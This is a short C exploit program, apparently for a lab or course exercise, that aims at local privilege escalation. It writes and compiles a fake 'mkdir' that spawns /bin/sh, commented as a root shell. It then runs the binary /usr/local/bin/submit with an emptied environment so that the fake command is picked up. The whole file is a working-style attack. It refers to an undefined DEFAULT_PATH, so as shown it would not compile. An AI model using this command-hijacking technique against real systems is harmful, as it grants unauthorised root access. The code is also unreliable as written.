#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/submit"

int main(void)
{
  char *args[] = { TARGET, "mkdir", NULL, NULL };
  char *env[] = { NULL };

  // Write C program to file
  FILE *fp = fopen("hax.c", "w+");
  fprintf(fp,
          "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n"
          "int main(void) {"
                "system(\"/bin/sh\");"          // Open bash session (as root)
                "exit(0);"
                "}"
          , DEFAULT_PATH);
  fclose(fp);

  // Compile
  system("gcc hax.c -o mkdir");

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
